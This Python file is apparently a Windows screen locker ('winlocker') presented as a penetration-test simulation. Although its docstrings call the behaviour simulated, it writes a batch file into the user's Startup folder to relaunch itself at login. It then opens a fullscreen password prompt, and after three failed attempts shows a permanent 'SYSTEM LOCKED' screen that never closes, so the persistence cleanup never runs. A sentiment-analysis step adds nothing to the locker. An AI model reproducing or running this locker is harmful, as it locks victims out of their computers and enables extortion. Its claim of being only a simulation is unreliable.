import getpass
import os
import logging
import hashlib
import re
from datetime import datetime
from tkinter import Tk, Label, Button, Entry, messagebox
from transformers import pipeline

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class MachineLearningWinlocker:
    SALT = "unique_salt"
    ATTEMPT_LIMIT = 3

    def __init__(self):
        """Initialize the MachineLearningWinlocker with user details and setup"""
        self.user_name = getpass.getuser()
        self.startup_path = fr"C:\Users\{self.user_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

        self.sentiment_analyzer = self.load_sentiment_analyzer()
        self.hashed_password = self.hash_password("test_password")  # You should replace this with more secure handling.
        self.failed_attempts = []
        self.remaining_attempts = self.ATTEMPT_LIMIT

    def load_sentiment_analyzer(self):
        """Load Hugging Face sentiment analysis pipeline"""
        try:
            sentiment_analyzer = pipeline("sentiment-analysis")
            logging.info("Sentiment analysis pipeline loaded.")
            return sentiment_analyzer
        except Exception as e:
            logging.error(f"Error loading sentiment analysis pipeline: {e}")
            return None

    def hash_password(self, password):
        """Hashes the password with a salt."""
        return hashlib.sha256((self.SALT + password).encode()).hexdigest()

    def validate_password(self, input_password):
        """Validates the user input password."""
        return self.hash_password(input_password) == self.hashed_password

    def log_failed_attempt(self, input_password):
        """Logs failed password attempts with masked input."""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        masked_password = "*" * len(input_password)
        self.failed_attempts.append((timestamp, masked_password))
        logging.warning(f"Failed attempt logged: {timestamp} - {masked_password}")

    def add_persistence(self, script_path):
        """Simulates adding a script to startup."""
        try:
            with open(os.path.join(self.startup_path, "open.bat"), "w+") as bat_file:
                bat_file.write(f'start "" {script_path}')
            logging.info("Startup persistence simulated.")
        except Exception as e:
            logging.error(f"Error creating startup script: {e}")

    def remove_persistence(self):
        """Simulates removing the startup persistence."""
        try:
            os.remove(os.path.join(self.startup_path, "open.bat"))
            logging.info("Startup persistence removed.")
        except FileNotFoundError:
            logging.warning("Startup script not found.")
        except Exception as e:
            logging.error(f"Error removing startup script: {e}")

    def analyze_input(self, user_input):
        """Analyzes input using sentiment analysis."""
        if not self.sentiment_analyzer:
            logging.error("Sentiment analyzer is unavailable.")
            return

        try:
            user_input = self.sanitize_input(user_input)
            result = self.sentiment_analyzer(user_input)
            sentiment = result[0]
            logging.info(f"Input analysis: {user_input}")
            logging.info(f"Sentiment: {sentiment['label']} (Score: {sentiment['score']:.2f})")

            if sentiment["label"] == "NEGATIVE":
                logging.warning("Suspicious or hostile input detected.")
            else:
                logging.info("Input seems normal.")
        except Exception as e:
            logging.error(f"Error analyzing input: {e}")

    def sanitize_input(self, user_input):
        """Sanitizes user input by removing unwanted characters."""
        return re.sub(r"[^a-zA-Z0-9\s.,!?]", "", user_input)

    def lock_screen(self):
        """Simulates a lock screen with password protection."""
        root = Tk()
        root.title("Penetration Test: System Locked")
        root.attributes("-fullscreen", True)

        Label(root, text="System Locked - Penetration Testing", font=("Arial", 24), bg="red", fg="white").pack(pady=20)
        Label(root, text="Enter your password to unlock", font=("Arial", 18), bg="black", fg="white").pack(pady=20)

        password_entry = Entry(root, show="*", font=("Arial", 18))
        password_entry.pack(pady=20)

        def attempt_unlock():
            """Handles the unlock attempt."""
            input_password = password_entry.get()
            if self.validate_password(input_password):
                messagebox.showinfo("Unlocked", "System successfully unlocked!")
                root.destroy()
            else:
                self.remaining_attempts -= 1
                self.log_failed_attempt(input_password)
                password_entry.delete(0, "end")
                if self.remaining_attempts <= 0:
                    self.trigger_safe_lock(root)
                else:
                    messagebox.showwarning("Failed", f"Incorrect password. Attempts left: {self.remaining_attempts}")

        Button(root, text="Unlock", font=("Arial", 18), command=attempt_unlock).pack(pady=20)

        root.mainloop()

    def trigger_safe_lock(self, root):
        """Triggers a permanent lock screen."""
        for widget in root.winfo_children():
            widget.destroy()
        Label(root, text="SYSTEM LOCKED", font=("Arial", 40), bg="black", fg="red").pack(expand=True)

    def cleanup(self):
        """Performs cleanup actions, removing persistence."""
        self.remove_persistence()
        logging.info("Cleanup complete.")


if __name__ == "__main__":
    winlocker = MachineLearningWinlocker()

    # Simulate adding a script to startup
    script_path = os.path.abspath(__file__)
    winlocker.add_persistence(script_path)

    # Simulate lock screen
    winlocker.lock_screen()

    # Analyze input
    inputs = ["I hate this program!", "This is interesting.", "Terminate the session!"]
    for user_input in inputs:
        winlocker.analyze_input(user_input)

    # Cleanup after test
    winlocker.cleanup()